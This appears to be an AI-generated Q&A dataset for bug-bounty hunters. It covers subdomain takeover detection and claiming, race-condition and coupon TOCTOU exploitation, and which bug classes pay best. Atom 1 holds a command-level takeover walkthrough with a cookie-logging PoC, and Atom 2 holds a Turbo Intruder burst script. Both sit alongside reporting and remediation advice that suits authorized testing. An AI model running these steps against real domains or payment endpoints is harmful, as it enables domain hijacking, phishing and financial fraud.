# mimo-v2.6-flash — bb-classes
# SOURCE: mimo-v2.6-flash, ATOMISED extraction (cybersec-atom-corpus method)

### Atom 1

Q: What are the exact steps to detect and exploit a subdomain takeover, from dangling CNAME detection to serving content on the claimed host?

# Subdomain Takeover: Detection Through Content Hosting

## 1. Enumerate and resolve candidate subdomains

Collect FQDNs from passive and active sources, then resolve them to build a CNAME map.

```bash
# Passive collection
assetfinder --subs-only target.com >> subs.txt
amass enum -passive -d target.com >> subs.txt
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' \
  | sort -u >> subs.txt

sort -u subs.txt -o subs.txt

# Resolve everything — capture CNAMEs specifically
while read sub; do
  dig +short "$sub" CNAME
done < subs.txt > cnames.txt
```

What you're looking for: a subdomain like `app.target.com` whose CNAME points at an external service (`something.github.io`, `*.herokuapp.com`, `*.azurewebsites.net`, `target.s3.amazonaws.com`, `*.cloudfront.net`, `*. pantheon.io`, etc.), rather than at infrastructure the target owns.

## 2. Fingerprint dangling references

A CNAME alone isn't enough — you must confirm the referenced resource is **unallocated**. Each service responds differently when a claimed resource is gone:

| Service | Dangling response signature |
|---|---|
| GitHub Pages | `404 There isn't a GitHub Pages site here.` |
| Heroku | `No such app` / `herokucdn.com/error-pages/brick-error.html` |
| Azure Websites | `404 - Web app not found` / `Error 404 - Web app not found.` |
| AWS S3 | `NoSuchBucket` in XML body |
| CloudFront | `ERROR: The request could not be satisfied` + CloudFront origin error |
| Fastly | `Fastly error: unknown domain` |
| Shopify | `Sorry, this shop is currently unavailable.` |
| Pantheon | `404 Unknown site` |
| WordPress.com | `Do you want to register` |
| Unbounce | `404 (Page Not Found)` |
| Strikingly | `{"status":404,"statusText":"page not found"}` |

Automated fingerprinting:

```bash
# subzy — checks for takeover-able services
subzy run --targets subs.txt --hide_fails

# subjack (enumeration + service fingerprint)
subjack -w subs.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3

# nuclei
nuclei -l subs.txt -t http/takeovers/

# can-i-take-over-urls (maintained fingerprint matrix per service)
# https://github.com/EdOverflow/can-i-take-over-urls
```

Manual verification for anything flagged — every automated tool reports false positives:

```bash
# Confirm the resource doesn't exist by attempting creation yourself
# e.g., re-register the exact bucket claimed by the CNAME:
aws s3api head-bucket --bucket target-prod-assets
# 404 → reusable. 403 → registered by someone, NOT vulnerable.

# DNS record must also still be live:
dig app.target.com CNAME
dig app.target.com A
# NXDOMAIN on the last node of the chain or a dead alias = dangling
```

Key distinction: **the victim subdomain must still resolve in DNS** (record exists) while **the target resource does not exist** at the provider. Both conditions must be true. If the DNS record itself is gone, there's nothing to hijack.

## 3. Claim the resource

Register the exact hostname the CNAME points at, at the provider. This is the entire "exploit" — you're not breaking anything; you're taking ownership of an already-orphaned cloud resource.

```bash
# Example: S3 — bucket name must match exactly (global namespace)
aws s3 mb s3://target-prod-assets --region us-east-1

# Example: GitHub Pages — create a repo named after the dangling reference
# CNAME points to target.github.io → create GitHub account/org named `target`,
# add a `username.github.io` repo, push an index.html

# Example: Azure — create a Web App whose default hostname matches:
# target-prod.azurewebsites.net
az webapp create --name target-prod --resource-group myRG --plan myPlan

# Example: Heroku — create an app with the exact name
heroku create target-prod   # → target-prod.herokuapp.com

# Example: CloudFront / Fastly / Pantheon / Shopify — claim the specific
# resource ID from the CF distribution ID or provider account per their signup flow
```

Timing note: some providers (Heroku, Azure) allow reclaiming deleted app names immediately; others (S3) hold no such quarantine — bucket names are free-for-all the moment they're deleted. GitHub Pages requires the account name to match, which is often available if accounts expire.

## 4. Serve content on the takeover host

Once the resource is claimed, you serve anything from it. Validation first:

```bash
# S3: upload and confirm the victim subdomain now serves your content
aws s3 sync ./payload/ s3://target-prod-assets/
aws s3 website s3://target-prod-assets --index-document index.html

# Point of proof:
curl -sI https://app.target.com/
# HTTP/2 200  ← your content, served on the victim's domain
```

Minimal proof-of-concept page:

```html
<!DOCTYPE html>
<html>
<head><title>Takeover PoC</title></head>
<body>
<h1>Subdomain takeover proof</h1>
<p>This asset was claimed after a dangling CNAME to <code>target-prod-assets</code>
was identified.</p>
<script>
  console.log(document.cookie); // demonstrates cookie exposure potential
</script>
</body>
</html>
```

## 5. Determine impact (this is what turns a PoC into a finding)

Content control on a victim-owned origin has escalating consequences depending on configuration:

- **Stored XSS on the parent origin scope.** If `app.target.com` is on the same site as authenticated app pages, your JS runs on a same-site origin. SameSite cookies scope by *registrable domain* in most cases — check whether the target uses `__Host-`/`__Secure-` prefixes (they pin the host, mitigating this) and whether cookies are set with explicit `Domain=target.com`.
- **Cookie capture / session theft** — only if cookies are scoped broadly (`Domain=target.com`) and not `HttpOnly`.
- **Credential phishing** — a credible login form on a trusted target.com host.
- **Email record abuse** — some dangling DNS records also permit adding an `MX`/`SPF`-relevant alias (TXT/SPF overlap errors, DMARC failures → mail spoofing viability check).
- **OAuth / SAML redirect** — if `app.target.com` appears in an allowed redirect URI whitelist, code-interception via `/callback`.
- **Cache poisoning adjacency** — CDN-fronted attractions (CloudFront, Fastly) can serve your origin to all cached users of the hostname.

Check samesite & cookie scoping before claiming XSS impact:

```bash
curl -sI https://app.target.com/ | grep -i set-cookie
```

## 6. Report properly

Include: the exact FQDN, the full CNAME chain with `dig +trace`, the provider's dangling-response evidence, proof screenshots/curl output with timestamps, and impact scoped to what you actually demonstrated — not the theoretical maximum.

```bash
dig app.target.com CNAME +noall +answer
dig app.target.com A +noall +answer
curl -s https://app.target.com/ | head -20   # provider 404 signature
```

## Automated pipeline

```bash
#!/usr/bin/env bash
# takeover-scan.sh — full pipeline
set -euo pipefail
DOMAIN="$1"

assetfinder --subs-only "$DOMAIN" | sort -u > subs.txt
amass enum -passive -d "$DOMAIN" -o amass.txt
cat subs.txt amass.txt | sort -u > all.txt

# resolve + filter for external CNAMEs
while read -r s; do
  cn=$(dig +short "$s" CNAME | head -1)
  [ -n "$cn" ] && echo "$s -> $cn" >> cnames.txt
done < all.txt

# fingerprint
cat all.txt | httpx -silent -status-code -cdn | grep -E '404|403' > probe.txt
subzy run --targets all.txt | tee takeover-report.txt
nuclei -l all.txt -t http/takeovers/ -severity high,critical -o nuclei-takeover.txt
```

## Mandatory retest after remediation

After the team removes the dangling record or claims the resource themselves: re-run the fingerprint, confirm your claimed resource no longer serves the victim hostname (`404` from the real origin or CNAME now points internally), and delete your claimed resource so the name is released.

**Remediation checklist for the report:** delete stale DNS records within their CI/CD (or use a linter like `dnscontrol` that reconciles records against live infrastructure), claim orphaned provider resources, monitor with continuous CNAME-scanning (Souregraph, GitHub Actions running subzy in scheduled cron), and prefer providers that support account-level binding (Azure custom domains are verified per-account, which structurally prevents takeover).

---

### Atom 2

Q: What request sequence proves a race condition in a limit-overrun endpoint, and what tool fires the parallel requests?

## The sequence

The proof has three phases: establish the limit, park the counter just below it, then collide requests inside the check‑then‑increment window.

**1. Baseline — find N**

```
POST /api/credits/redeem   HTTP/1.1   → 200 OK   (req 1..9)
POST /api/credits/redeem   HTTP/1.1   → 429      (req 10)
```

Confirm N is stateful (resets on a `Retry-After` / window boundary, and not per-session). Reset the limit, and make sure you're testing the counter you think you are.

**2. Park — get to N−1**

Fire N−1 requests **sequentially** so the counter is one below the limit. Record the exact response body/headers for the "allowed" case and for the "denied" case — you need both fingerprints to classify results later.

**3. Collide — burst K > 1 at the same instant**

With the counter at N−1, launch K simultaneous requests (K = 8–20 is usually enough):

```
counter = N-1
   ├─ req_A ┐
   ├─ req_B ├─ all pass the `count < N` check before any writes
   ├─ req_C │   → 200
   └─ req_D ┘
```

**4. Classify**

Total successes across the whole run must be **exactly N**. The proof is:

```
successes_total = (N-1 parked) + (200s from burst)  >  N
```

Repeat 10–20 times and report the hit rate (e.g. "N=10, 8/20 bursts yielded 11–14 total successes"). A single overshoot can be a fluke; a reproducible distribution is a finding. Capture one full response set showing all K burst responses returning 200 with incrementing/identical resource IDs.

**Controls worth running:**
- Compare against the same burst with `Connection: close` / HTTP/1.1 keep-alive off — if it only races over HTTP/2 or a single connection, say so, it tells you where the lock boundary is.
- Change only the concurrency (K = 1 vs K = 4 vs K = 20) and show successes scale with K, not with elapsed time.

---

## The tool

**Burp Suite Professional → Turbo Intruder** is the canonical answer, because it has an explicit `gate` (a barrier) that holds every request until all are queued, then releases them on the same tick:

```python
def queueRequests(target):
    gate = 'race_gate'
    for i in range(20):
        engine.queue(target.tabName, gate=gate)
    engine.openGate(gate)

def handleResponse(request, response):
    findings.add(request, response)
```

Alternatives, depending on what you have:

| Tool | Use when |
|---|---|
| **Burp → Repeater multi-select → "Send group in parallel"** | Quick manual proof, no script needed |
| **Burp single-packet attack (HTTP/2 race the unwrap)** | Tightest window — all requests in one TCP segment; use when the window is a few μs |
| **`ffuf -t 50`** | Crude concurrency; fine for a coarse limit, weak for a tight race |
| **Go `sync.WaitGroup` / Python `asyncio.Barrier`** | You need reproducible K, timing histograms, or many iterations for a report |
| **`h2` / curl `--parallel`** | No Burp license on hand |

For an actual report, Turbo Intruder or a small Go client with a `sync.Barrier` gives you the repeatable iteration count you need to show a distribution rather than a one-off.

---

### Atom 3

Q: How does a TOCTOU flaw in a coupon or payment endpoint get exploited, and what two requests must interleave?

## The core flaw

A TOCTOU (time-of-check to time-of-use) bug exists when a coupon/payment endpoint validates state in one operation and mutates state in a later operation, without making the pair atomic. The validation is correct at the moment it runs — the flaw is that the system trusts that result after the world has changed underneath it, typically because the coupon record, balance, or usage counter is read without a lock and written later without re-verifying.

## The two requests that must interleave

**Request A — the validation (the "check"):** reads the coupon/redemption/balance state and decides the operation is legal.

**Request B — the consumption (the "use"):** mutates that same state — redeems the coupon, spends the balance, bumps the usage counter — *after* A's check but *before* A's use.

The sequence:

1. **A → validate:** `SELECT redeemed, max_uses FROM coupons WHERE code='SAVE20'` → `redeemed=0 < max_uses=1` → passes.
2. **B → redeem:** spends the coupon, commits `redeemed=1`. B's checkout succeeds with the discount.
3. **A → apply:** applies the discount and commits, using its now-stale check → second successful redemption of a single-use coupon.

The same pattern works on balance: A checks `balance >= 100`, B (`/withdraw` or a parallel `/checkout`) drains the account, A then debits 100 → double spend / negative balance.

The interleave has to land inside the window between A's read and A's write. Two identical checkout requests racing each other (both pass the check before either commits) is the same bug expressed without a distinct *B* — it degrades into a plain race on a non-atomic read-modify-write.

## Typical exploitation notes

- The window is usually milliseconds, so it's driven with concurrent connections (parallel requests, race tooling, HTTP/2 multiplexing) and repeated until the commit ordering lines up.
- Widening the window: slow downstream calls between validate and apply (payment gateway latency, DB contention) make the check-use gap reliably exploitable even from a single sequential flow.
- Detection signals: two redemptions with the same code/timestamps, usage counters exceeding `max_uses`, negative balances, idempotency keys that never get enforced.
- Impact scales with value density — loyalty points, refund flows, gift cards, referral bonuses, quantity-limited drops.

## Fix

Make check-and-use one conditional write, so no state can change between them:

```sql
UPDATE coupons
   SET redeemed = redeemed + 1
 WHERE code = $1
   AND redeemed < max_uses
   AND active = TRUE;
-- success = rowCount == 1; anything else is rejected
```

If multiple statements are unavoidable, run them inside a transaction with `SELECT ... FOR UPDATE` (or serializable isolation), re-validating inside the same transaction. Complement with:

- **Idempotency keys** (client-supplied UUID, `UNIQUE` constraint) so replayed/duplicated requests collapse to one effect.
- **Optimistic locking** — version column checked in the `WHERE` clause, conflict on mismatch.
- **Unique constraints** as the final backstop: `UNIQUE(coupon_id, order_id)` on redemptions turns a residual race into a constraint violation instead of a double discount.

The invariant to design around: *the validity check must be evaluated by the same atomic operation that performs the spend.*

---

### Atom 5

Q: Which bug classes historically have the highest bounty payout-to-effort ratio on broad-scope programs, and why?

**Short answer:** the historically best payout-to-effort classes are broken object/function-level authorization, account-takeover chains, and SSRF — with era-specific spikes from cache poisoning, race conditions, and n-day RCE on forgotten assets. The common thread is that severity pricing tracks *impact*, not *labor*, so anything where a one-request repro produces a high-severity verdict is structurally mispriced in the researcher's favor.

Caveat on evidence: paid bounty amounts are mostly private, and public disclosed-report datasets are biased toward duplicates and interesting findings. The picture below comes from disclosure streams, program severity tables, and researcher reporting rather than a clean dataset.

## The classes, ranked by historical ratio

**1. Broken authorization (IDOR, BOLA, forced browsing, missing function checks)**
Probably the single best class historically, and it stays near the top because it regenerates as products ship new endpoints. Setup is two accounts (or free/enterprise tiers); discovery is a proxied crawl with Autorize, AuthMatrix, or manual ID enumeration. Payouts commonly land $500–$10k for high-severity data exposure, sometimes far more for cross-tenant. The repeatable win is that *finding* it is mechanical while *severity* is computed from what the object contains.

**2. Account takeover chains — password reset, email change, OAuth/login-CSRF, account linking**
PreAuth takeover almost always prices as Critical ($2k–$25k+) but frequently takes one focused hour: host-header or prefix-injection in reset links, `redirect_uri` regex/wildcard leniency, unverified email-change, linking a victim's social identity to your account. On broad-scope programs these recur constantly across acquired and white-label products with inconsistent auth libraries.

**3. SSRF → cloud metadata / internal control planes**
Peaked around 2019–2022. Often a single URL parameter plus a DNS rebinding or redirect trick; priced at High/Critical because credential theft is legible to triage. Ratio has compressed since IMDSv2, URL allowlists, and generic-deny took hold, plus saturation made it duplicate-heavy — but it remains excellent on programs with legacy internal tooling in scope.

**4. Race conditions and business logic in money-adjacent flows**
Coupon reuse, points double-spend, concurrent withdrawal, quantity/negative-price manipulation. The tool entry cost is low — Turbo Intruder or a hand-rolled concurrent script — and impact is denominated in dollars, which triage can't argue with. Strong 2020–2023; pricing is strong but effort isn't always trivial because you need to understand the workflow.

**5. Sensitive data exposure — git history, backup files, staging hosts, storage ACLs, .env in CI artifacts**
Near-zero marginal effort once the enumeration is scripted (trufflehog/gitleaks over git histories, gf patterns, backups, JS-bundled secrets). Payouts are inconsistent — some programs pay well for cloud keys, many pay flat $100–$500 for anything "informational-looking." Ratio is excellent where a program treats leaked credentials as High; terrible where they're capped.

**6. Subdomain takeover / dangling infrastructure**
Effort is close to a scripted sweep + one screenshot. Broad scope is exactly what makes this profitable, because accumulated DNS records from reorgs and decommissioned services are abundant. But:
 inconsistency across programs caps expected value.

**7. n-day / 1-day exploit replay on forgotten assets**
Unpatched Confluence, Zabbix, Jenkins, VPN appliances, exposed admin consoles on staging or acquired subdomains. Effort is running nuclei templates; on programs that count RCE at full value, this has been enormous ROI. The variance is brutal though — many programs pay flat or exclude known-vuln findings — so expected value depends on scope terms more than the vuln class.

**8. Web cache poisoning / cache deception**
An era-specific anomaly: 2018–2020, one crafted request to unkeyed input frequently yielded Critical-severity XSS or RCE on the cache tier, at $2k–$20k. High ROI while the class was novel; tooling and unkeyed-input knowledge largely closed it.

## Why these dominate — the structural reasons

**Severity, not labor, sets price.** Severity models (CVSS-derived, or program-specific bands) price *what an attacker could do on the worst-case device*, while the attacker's cost is whatever the script took. Where those two decouple, ratio is high. Where a program pays flat by severity band, the decoupling is even starker: a Critical-priced SSRF and a day-long RCE chain pay identically — so the cheap one wins.

**Logic/authorization classes are under-defended relative to sink classes.** DAST, SAST, WAFs, and bug bounty VDP funnels attack injection, XSS, and known vulns. Almost no scanner tests whether user B should be able to read user A's invoice. Defensive coverage and bounty coverage are inversely correlated, and that gap is *where the ratio lives*.

**Discovery is automatable but the finding is human-judgeable.** The ideal crime is: script finds the candidate, human spends five minutes confirming, triage reads it and sees impact instantly. IDOR, takeover, stale-CNAME, and leaked-credential classes all fit that shape. Contrast with a memory-corruption chain, where effort is enormous and triage may take weeks to accept.

**Repro legibility reduces effort's hidden component.** The denominator isn't just exploitation time — it's back-and-forth, extra evidence requests, scope disputes, and duplicate negotiation. A single-request, single-har request, screenshot-ready repro costs almost nothing in negotiation time. Multi-step business-logic reports frequently cost more in argumentation than in discovery.

**Broad scope multiplies *unreviewed* surface specifically.** The value of a wide scope isn't the number of subdomains — it's that acquired products, white-label deployments, internal admin tools, and legacy apps were written by different teams with different auth middleware, and often nobody has audited them since acquisition. Rate of *fresh* authorization defects per hour of testing is highest exactly where modern code hasn't been scrutinized.

## What reliably destroys the ratio

- **Flat severity-banded payouts for classes with high discovery variance** (e.g., $1,000 flat anywhere between "info" and "critical") — kills n-day and misconfig work.
- **High duplicate rates.** XSS, SQLi, subdomain takeover, and cookie/`WWW-Authenticate` reflection are all low-effort but heavily contested; expected value is effort ÷ (1 − duplicate-rate), which goes negative fast.
- **Out-of-scope pivots.** "Known vulnerabilities," "social engineering," "software version disclosure," and "missing security headers" carve-outs have historically eaten a lot of scripted-sweep time.
- **Automated scanning in a program's own pipeline.** Anything your nuclei/burp scan finds, their scan probably finds first — this is why generic misconfig classes have degraded over time on mature programs.

**Reading:** if you're allocating audit time to a broad-scope program, the durable strategy is to spend the first hours on *authorization and account-state workflows on the newest/acquired surface*, and treat scanner output as a dup-rate trap rather than a target list.

